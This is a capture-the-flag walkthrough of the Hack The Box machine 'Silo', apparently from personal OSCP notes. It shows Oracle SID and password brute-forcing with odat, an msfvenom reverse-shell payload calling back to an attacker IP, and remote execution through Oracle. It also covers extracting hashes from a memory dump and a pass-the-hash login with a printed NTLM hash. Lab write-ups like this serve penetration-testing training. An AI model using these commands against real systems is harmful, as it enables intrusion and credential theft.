## Silo

Difficulty: Medium

### User and Root Flag

```
rustscan -a 10.10.10.82 --ulimit 5000 -- -A -sV -sC -oN nmap.txt -Pn
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/31be8266-2d50-4e92-b848-8261f0339e7a)

<br>

Searching for Oracle TNS listener pentest, we find this tool called odat.

We first need to find SIDs and brute force users.

```
# Find sids
python3 odat.py sidguesser -s silo.htb -p 1521 --sids-file=resources/sids.txt

# Brute force credentials
python3 odat.py passwordguesser -s silo.htb -d XE
```

![findSid](https://github.com/b1d0ws/OSCP/assets/58514930/b2523bbf-3005-4926-b343-e451facf2c8e)

![bruteForceUser](https://github.com/b1d0ws/OSCP/assets/58514930/7bf3fb73-88f8-4114-83fd-662de7c538e2)

<br>

Finding valid credentials, we can upload a reverse shell executable.

```
# Creating payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=1337 -f exe > revshell.exe

# Uploading file
python3 odat.py utlfile -s silo.htb --sysdba -d XE -U scott -P tiger --putFile /temp shell.exe ../revshell.exe

# Getting reverse shell
python3 odat.py externaltable -s silo.htb --sysdba -d XE -U scott -P tiger --exec /temp shell.exe
```

![generatePayload](https://github.com/b1d0ws/OSCP/assets/58514930/b07b4e54-6815-46d6-b36b-53f8a6682532)

![reverseShell](https://github.com/b1d0ws/OSCP/assets/58514930/1ea5131d-8545-4120-a6f7-ff08f7165970)

#### Extra

```
# There is this file "Oracle issue.txt" on desktop, but the password is not being displayed correctly.

# Convert to base64 on Windows
$fc = Get-Content "Oracle issue.txt"
$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)
[System.Convert]::ToBase64String($fe)

# Read it on Linx
echo -n "U3VwcG9ydCB2ZW5kb3IgZW5nYWdlZCB0byB0cm91Ymxlc2hvb3QgV2luZG93cyAvIE9yYWNsZSBwZXJmb3JtYW5jZSBpc3N1ZSAoZnVsbCBtZW1vcnkgZHVtcCByZXF1ZXN0ZWQpOiAgRHJvcGJveCBsaW5rIHByb3ZpZGVkIHRvIHZlbmRvciAoYW5kIHBhc3N3b3JkIHVuZGVyIHNlcGFyYXRlIGNvdmVyKS4gIERyb3Bib3ggbGluayAgaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2gvNjlza3J5emZzemI3ZWxxL0FBRFpuUUViYnFEb0lmNUwyZDBQQnhFTmE/ZGw9MCAgbGluayBwYXNzd29yZDogwqMlSG04NjQ2dUMk" | base64 -d

# With this we get access to a dump file. We can extract hashes using volatility.
volatility -f SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump

# Login with pass the hash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.82 cmd
```
